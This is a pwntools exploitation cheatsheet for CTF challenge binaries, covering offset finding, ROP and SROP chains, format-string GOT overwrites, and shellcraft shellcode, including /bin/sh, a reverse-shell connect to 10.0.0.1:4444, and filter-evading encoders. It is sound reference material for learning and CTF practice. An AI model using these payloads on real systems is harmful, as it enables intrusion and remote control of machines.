---
title: "pwntools - Complete Exploitation Cheatsheet"
category: pwn
subcategory: tooling
type: cheatsheet
tags: [pwntools, rop, ret2libc, shellcode, shellcraft, cyclic, de-bruijn, gdb, gef, pwndbg, checksec, elf, got, plt, relro, nx, pie, aslr, canary, fmtstr]
summary: "150+ pwntools idioms: tubes, context, ELF/libc, ROP(), shellcraft, cyclic, packing, fmtstr_payload, gdb.attach + tmux, and a full debug workflow."
tools: [pwntools, gdb, gef, pwndbg, checksec, one-gadget, ropgadget]
related: [exploit-template, offset-finder, rop-fundamentals, rop-ret2libc, gdb-gef-pwndbg-cheatsheet, rop-gadgets-cheatsheet, shellcode-cheatsheet]
---

## Install & sanity

```bash
# Install into a venv (pwntools pulls a lot of deps; never install to system python)
python3 -m venv ~/.venv/pwn && . ~/.venv/pwn/bin/activate && pip install -U pwntools

# Verify the CLI shipped alongside the library
pwn version

# One-shot checksec from the CLI (no script needed)
pwn checksec ./vuln

# Assemble / disassemble from the shell
pwn asm 'xor rax, rax' --context=amd64
pwn disasm '4831c0' --context=amd64

# Generate a cyclic pattern and look an offset up
pwn cyclic 200
pwn cyclic -l 0x6161616c
pwn cyclic -l 'kaaa'

# Hex helpers
pwn hex 'flag{x}'
pwn unhex 666c6167
pwn phd ./dump.bin          # pretty hexdump
```

## Imports and context

```python
# The one import everybody uses - pulls in tubes, ELF, ROP, asm, p64, log, ...
from pwn import *

# Architecture / bits / endianness. Sets defaults for asm(), p64(), shellcraft, cyclic.
context.arch = 'amd64'        # 'i386', 'amd64', 'arm', 'aarch64', 'mips', 'thumb'
context.bits = 64
context.endian = 'little'
context.os = 'linux'

# Set everything at once by pointing at the binary - THE idiom
context.binary = elf = ELF('./vuln')

# Or in one call
context.update(arch='amd64', os='linux', log_level='debug')

# Verbosity: 'debug' prints every byte sent/received in hexdump form
context.log_level = 'debug'   # 'info' (default), 'warn', 'error', 'critical'

# Quiet a noisy section
with context.quiet:
    io = process('./vuln')

# Terminal used by gdb.attach - required for gdb to actually open
context.terminal = ['tmux', 'splitw', '-h']            # horizontal split
context.terminal = ['tmux', 'splitw', '-v', '-p', '70']
context.terminal = ['x-terminal-emulator', '-e']       # plain X terminal
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali'] # Windows Terminal + WSL

# Default timeout for recv* calls
context.timeout = 5

# Deterministic cyclic patterns / randomness
context.randomize = False
```

## Tubes: process, remote, ssh

```python
# Local process
io = process('./vuln')
io = process(['./vuln', 'arg1', 'arg2'])
io = process('./vuln', env={'LD_PRELOAD': './libc.so.6'})
io = process('./vuln', cwd='/tmp/chal')
io = process('./vuln', aslr=False)                 # disable ASLR for this child
io = process('./vuln', stdin=PTY, stdout=PTY)      # force a tty (line buffering!)
io = process(['stdbuf', '-i0', '-o0', '-e0', './vuln'])  # kill libc buffering

# Run under a custom loader (patched libc without patchelf)
io = process(['./ld-2.31.so', './vuln'], env={'LD_PRELOAD': './libc.so.6'})

# Remote
io = remote('chal.ctf.example', 1337)
io = remote('chal.ctf.example', 1337, ssl=True)
io = remote('chal.ctf.example', 1337, typ='udp')

# Listen (for reverse shells)
io = listen(4444).wait_for_connection()

# SSH
sh = ssh(host='chal.ctf.example', user='ctf', password='ctf', port=22)
sh = ssh(host='h', user='u', keyfile='./id_rsa')
io = sh.process('/challenge/vuln')
io = sh.run('/bin/sh')
sh.download('/home/ctf/libc.so.6', './libc.so.6')
sh.upload('./exploit.py', '/tmp/exploit.py')
print(sh['id'])                                    # run a one-liner, get output
sh.interactive()

# Serial / raw fd
io = serialtube('/dev/ttyUSB0', baudrate=115200)

# Housekeeping
io.close()
io.pid                                             # local pid (process only)
```

## Sending and receiving

```python
io.send(b'AAAA')                 # raw
io.sendline(b'AAAA')             # raw + b'\n'
io.sendafter(b'> ', b'AAAA')     # wait for prompt, then send
io.sendlineafter(b'> ', b'AAAA') # THE most used call in pwn
io.sendthen(b'ok', b'payload')   # send, then recvuntil(b'ok')

io.recv()                        # up to 4096 bytes, whatever is ready
io.recv(8)                       # exactly-ish 8 bytes
io.recvn(8)                      # EXACTLY 8 bytes or timeout
io.recvline()                    # one line, includes b'\n'
io.recvline(keepends=False)      # strip the newline
io.recvlines(3)                  # list of 3 lines
io.recvuntil(b'flag{')           # read through a delimiter
io.recvuntil(b'> ', drop=True)   # and discard the delimiter
io.recvall()                     # until EOF (blocks)
io.recvregex(rb'0x[0-9a-f]+')    # returns the matched bytes
io.recvrepeat(0.5)               # keep reading for 0.5s then return

io.clean()                       # drain whatever is buffered, discard
io.clean(0.2)
io.unrecv(b'putback')            # push bytes back into the buffer

io.interactive()                 # hand the tube to your keyboard
io.interactive(prompt='')        # no local prompt noise
```

### Short helper aliases (paste at the top of every exploit)

```python
s    = lambda d:      io.send(d)
sl   = lambda d:      io.sendline(d)
sa   = lambda t, d:   io.sendafter(t, d)
sla  = lambda t, d:   io.sendlineafter(t, d)
sn   = lambda n, d:   io.send(str(n).encode() + d)
sna  = lambda t, n:   io.sendlineafter(t, str(n).encode())
r    = lambda n=4096: io.recv(n)
rl   = lambda:        io.recvline()
ru   = lambda t:      io.recvuntil(t)
rn   = lambda n:      io.recvn(n)
ia   = lambda:        io.interactive()
```

## Packing and unpacking

```python
p8(0x41); p16(0x4141); p32(0xdeadbeef); p64(0xdeadbeefcafebabe)
u8(b'A'); u16(b'AA'); u32(b'AAAA'); u64(b'AAAAAAAA')

# Endianness / signedness overrides
p32(0x1234, endian='big')
u64(data, sign=True)

# Short leaks padded out - the single most common leak idiom
libc_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
pie_leak  = u32(io.recv(4))

# 6-byte leak inside a longer blob
leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

# flat(): build a payload from mixed types, auto-packed with context.word_size
payload = flat(
    b'A' * 40,
    pop_rdi,
    binsh,
    ret,
    system,
)

# flat() with a dict = write at offsets, pad the rest
payload = flat({40: pop_rdi, 48: binsh, 56: system}, filler=b'\x00')

# fit() is the same thing (older alias)
payload = fit({0: b'AAAA', 32: p64(0xdeadbeef)})

# Convenience
payload = cyclic(200)
payload = b'A' * 40 + p64(win)
print(hexdump(payload))
print(enhex(payload)); print(unhex('4141'))
xor(b'abcd', 0x41)               # xor helper
bits(b'A'); unbits([0,1,0,...])
```

## cyclic / De Bruijn offsets

```python
# Generate a De Bruijn pattern (default n=4 on 32-bit thinking, set n=8 for 64-bit)
pat = cyclic(500)                     # 4-byte subsequences
pat = cyclic(500, n=8)                # 8-byte subsequences - use for amd64 rsp/rip

# Look up an offset from a crash value
cyclic_find(0x6161616b)               # from a 32-bit eip
cyclic_find(b'kaaalaaa', n=8)         # from an 8-byte rsp/rip value
cyclic_find(p64(0x6161616161616166), n=8)

# Custom alphabet (when the input filters characters)
pat = cyclic(300, alphabet=string.ascii_lowercase.encode(), n=4)

# Full offset discovery, local, with a core dump
io = process('./vuln')
io.sendline(cyclic(400, n=8))
io.wait()
core = io.corefile
log.info('rsp  = %#x', core.rsp)
log.info('rip  = %#x', core.rip)
offset = cyclic_find(core.read(core.rsp, 8), n=8)
log.success('offset = %d', offset)
```

## ELF: symbols, GOT, PLT, addresses

```python
elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
ld   = ELF('./ld-2.31.so')

elf.address                       # 0 for non-PIE, load base for PIE
elf.address = 0x555555554000      # rebase everything at once (PIE)
elf.pie                           # bool
elf.checksec()                    # prints RELRO/canary/NX/PIE

elf.symbols['main']               # any symbol
elf.sym['win']                    # short alias
elf.functions['main'].address
elf.functions['main'].size
elf.got['puts']                   # GOT entry address
elf.plt['puts']                   # PLT stub address
elf.bss()                         # start of .bss
elf.bss(0x100)                    # .bss + 0x100 (scratch space)
elf.get_section_by_name('.data').header.sh_addr
elf.entry

# String search inside the binary / libc
next(elf.search(b'/bin/sh\x00'))
next(libc.search(b'/bin/sh\x00'))
list(elf.search(asm('pop rdi; ret')))

# libc base from a leak
libc.address = leak - libc.sym['puts']
system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh\x00'))

# Patch a binary on disk
elf.asm(elf.sym['main'], 'ret')
elf.save('./vuln_patched')

# libc that came with the challenge, auto-linked into process()
io = process('./vuln', env={'LD_PRELOAD': './libc.so.6'})
# or, better, patch it once:
#   patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc.so.6 ./vuln
```

## ROP()

```python
rop = ROP(elf)
rop = ROP([elf, libc])            # search both
rop = ROP(elf, badchars=b'\x0a\x00')

# High level: pwntools resolves the calling convention for you
rop.call('puts', [elf.got['puts']])
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.puts(elf.got['puts'])         # attribute style
rop.call('main')
rop.raw(rop.find_gadget(['ret'])[0])   # alignment ret

# Raw gadget hunting
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
leave   = rop.find_gadget(['leave', 'ret'])[0]

# Regex-ish search over the gadget DB
pop_rdx = rop.rdx.address           # pwntools auto-solves "set rdx" if it can
rop.rdi = binsh                     # register assignment interface
rop.rsi = 0
rop.rdx = 0

# Prebuilt syscall wrappers (needs a syscall gadget in scope)
rop.execve(binsh, 0, 0)
rop.mprotect(0x404000, 0x1000, 7)
rop.read(0, elf.bss(0x200), 0x100)

# Inspect and emit
print(rop.dump())                  # annotated chain - ALWAYS look at this
payload = rop.chain()              # bytes
payload = bytes(rop)               # same thing

# ret2csu helper
rop.ret2csu(edi=1, rsi=elf.got['puts'], rdx=8)

# ret2dlresolve, no leak needed
dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dl.data_addr)
rop.ret2dlresolve(dl)
payload = b'A' * offset + rop.chain() + dl.payload
```

## SROP

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget
frame.rsp = elf.bss(0x400)
payload = b'A' * offset + p64(syscall_ret) + bytes(frame)

# i386 variant
context.arch = 'i386'
frame = SigreturnFrame(kernel='amd64')   # when the kernel is 64-bit
```

## shellcraft and asm

```python
context.arch = 'amd64'
sc = asm(shellcraft.sh())                     # execve /bin/sh
sc = asm(shellcraft.execve('/bin/sh', ['/bin/sh'], 0))
sc = asm(shellcraft.amd64.linux.sh())
sc = asm(shellcraft.cat('/flag.txt'))
sc = asm(shellcraft.cat('/flag.txt', fd=1))
sc = asm(shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
sc = asm(shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupsh())
sc = asm(shellcraft.findpeersh())             # reuse the current socket
sc = asm(shellcraft.mmap_rwx())
sc = asm(shellcraft.infloop())                # great breakpoint substitute

print(shellcraft.sh())                        # print the assembly source

# Hand-written assembly
sc = asm('''
    xor  rsi, rsi
    push rsi
    mov  rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop  rdi
    push 59
    pop  rax
    cdq
    syscall
''')

# Disassemble bytes you found
print(disasm(sc))
print(disasm(b'\x48\x31\xc0', arch='amd64'))

# Null-free / restricted encoders
sc = encoders.encode(asm(shellcraft.sh()), avoid=b'\x00\x0a\x20')
sc = encoders.alphanumeric(asm(shellcraft.sh()))
sc = encoders.xor.encode(sc, avoid=b'\x00')

# Make an ELF out of shellcode to test it
ELF.from_assembly(shellcraft.sh()).save('./sc'); os.chmod('./sc', 0o755)
run_assembly(shellcraft.sh()).interactive()
run_shellcode(sc).interactive()
```

## Format strings

```python
# Build a payload that writes values at addresses
payload = fmtstr_payload(6, {elf.got['exit']: elf.sym['win']})
payload = fmtstr_payload(6, {elf.got['puts']: libc.sym['system']}, write_size='short')
payload = fmtstr_payload(6, {addr: val}, write_size='byte')      # %hhn, safest
payload = fmtstr_payload(6, {addr: val}, numbwritten=8)          # chars already printed
payload = fmtstr_payload(6, {addr: val}, write_size_max='int')

# Fully automated: give it a callable that does one printf round
def send_fmt(payload):
    io.sendline(payload)
    return io.recvuntil(b'\n', drop=True)

fmt = FmtStr(execute_fmt=send_fmt)
log.info('offset = %d', fmt.offset)
fmt.write(elf.got['exit'], elf.sym['win'])
fmt.execute_writes()

# Offset discovery by hand
for i in range(1, 30):
    io = process('./fmt')
    io.sendline(b'AAAAAAAA|%' + str(i).encode() + b'$p')
    out = io.recvall()
    if b'4141414141414141' in out:
        log.success('offset %d', i)
    io.close()
```

## gdb integration

```python
# Attach to a running local process and stop it
gdb.attach(io)
gdb.attach(io, gdbscript='''
    b *main+42
    c
''')

# Start under gdb from the beginning (returns the tube)
io = gdb.debug('./vuln', gdbscript='b main\nc')
io = gdb.debug(['./vuln', 'arg'], gdbscript=GDBSCRIPT, env={'X': 'y'})
io = gdb.debug('./vuln', api=True)     # io.gdb gives a python RPC handle

# Remote gdbserver
io = gdb.debug('./vuln', gdbscript='...', exe='./vuln', ssh=sh)

# API mode: script the debugger from python
io = gdb.debug('./vuln', api=True)
io.gdb.execute('b *0x401234')
io.gdb.continue_and_wait()
print(hex(io.gdb.parse_and_eval('$rsp')))

GDBSCRIPT = '''
set follow-fork-mode child
b *$rebase(0x1234)
b *main+90
commands
    telescope $rsp 20
end
c
'''
```

### tmux workflow (the thing that makes gdb.attach actually work)

```bash
# Start tmux, then run the exploit inside it; the split opens automatically
tmux new -s pwn
# In the pwn session:
python3 exploit.py GDB
```

```python
context.terminal = ['tmux', 'splitw', '-h', '-p', '65']
```

## args: argv-driven local / remote / gdb

```python
# pwntools parses UPPERCASE argv entries into `args`
#   python3 exploit.py REMOTE        -> args.REMOTE == '1'
#   python3 exploit.py GDB           -> args.GDB    == '1'
#   python3 exploit.py HOST=1.2.3.4 PORT=1337
if args.REMOTE:
    io = remote(args.HOST or 'chal.example', int(args.PORT or 1337))
elif args.GDB:
    io = gdb.debug('./vuln', gdbscript=GDBSCRIPT)
else:
    io = process('./vuln')

if args.DEBUG:            # DEBUG is special-cased -> log_level = 'debug'
    pass
level = args.LEVEL or 'info'
```

## Logging

```python
log.info('leak = %#x', leak)
log.success('shell!')
log.warning('canary looks wrong')
log.failure('no gadget')
log.error('fatal - raises PwnlibException')
log.debug('only shown at log_level=debug')

p = log.progress('Bruteforcing')
for i in range(256):
    p.status('byte %d', i)
p.success('done')

with log.progress('Leaking') as pr:
    pr.status('round 1')
    pr.success('got it')

# Nice hex logging helper
def leak(name, val):
    log.success('%-14s = %#x' % (name, val))
```

## Misc utilities

```python
pause()                              # wait for Enter - put it before gdb.attach
sleep(0.2); time.sleep(0.2)
which('gdb')
read('./flag'); write('./out', data)
os.system('checksec ./vuln')

more = bytes(remote_fd)
group(8, data)                       # chunk bytes into 8-byte groups
align(16, len(payload))
cyclic_metasploit(200)               # msf-style pattern
randoms(8); randoms(8, alphabet=string.digits)

md5sumhex(b'x'); sha256sumhex(b'x')
b64e(b'x'); b64d('eA==')
bits_str(b'A')

# Fast brute-force loop against a fork server
for attempt in range(1000):
    try:
        io = remote(HOST, PORT)
        io.sendline(payload)
        io.recvline(timeout=0.5)
        io.sendline(b'echo PWNED')
        if b'PWNED' in io.recvrepeat(0.3):
            log.success('hit after %d', attempt)
            io.interactive()
            break
    except EOFError:
        pass
    finally:
        io.close()
```

## Full debugging workflow

```bash
# 1. Triage the binary
file ./vuln && pwn checksec ./vuln && strings -n 8 ./vuln | head -50
ldd ./vuln                               # which libc does it want
```

```python
# 2. Find the crash offset (see offset-finder for the full script)
io = process('./vuln'); io.sendline(cyclic(400, n=8)); io.wait()
print(cyclic_find(io.corefile.read(io.corefile.rsp, 8), n=8))
```

```bash
# 3. Collect gadgets
ROPgadget --binary ./vuln > gadgets.txt
ropper -f ./vuln --search 'pop rdi'
one_gadget ./libc.so.6
```

```python
# 4. Build the chain with rop.dump() open in front of you
rop = ROP(elf); rop.call('puts', [elf.got['puts']]); rop.call('main')
print(rop.dump())
```

```python
# 5. Run under gdb, break just before the ret, and telescope the stack
io = gdb.debug('./vuln', gdbscript='b *vuln+70\nc')
io.sendline(payload)
# in the gdb pane:  telescope $rsp 20   /   x/20gx $rsp   /   vmmap
```

```python
# 6. Flip to remote with a single argv word
#    python3 exploit.py REMOTE HOST=chal.example PORT=1337
```

## Common gotchas

```text
# Leak is 6 bytes on amd64, not 8 - always .ljust(8, b'\x00')
# recvline() keeps the trailing \n - .strip() before u64()
# sendline adds \n; scanf("%s") stops at whitespace, read() does not
# Full-buffered stdout in a piped process hides prompts -> use stdbuf or PTY
# process() ASLR is ON by default even if your shell has it off
# context.binary must be set BEFORE ROP()/asm() to get the right arch
# gdb.attach() silently no-ops without a working context.terminal
# p64() of an address containing \x0a breaks gets()/fgets() payloads
# cyclic() defaults to n=4 - pass n=8 on amd64 or the lookup fails
# ELF() caches; re-run ELF() after patching the file on disk
```
